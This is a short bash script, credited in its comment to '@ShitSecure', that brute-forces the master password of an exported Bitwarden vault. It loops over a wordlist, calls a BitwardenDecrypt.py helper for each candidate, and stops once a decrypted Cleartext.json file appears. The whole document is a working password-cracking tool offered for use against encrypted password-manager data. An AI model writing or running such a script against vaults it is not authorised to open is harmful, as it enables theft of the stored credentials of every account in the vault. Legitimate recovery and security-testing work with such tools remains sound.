# Little bitwarden brute force script by @ShitSecure

if [ -z "$2" ]
  then
    echo "Usage: bash decrypt.sh /path/to/data.json /path/to/wordlist.txt"
    exit
fi

while read p; do
  printf "\n\nTesting the password: $p \n"
  python3 BitwardenDecrypt.py $1 "$p"
  FILE=Cleartext.json
  if test -f "$FILE"; then
      echo "Got the password, exiting"
      exit
  fi
done <$2
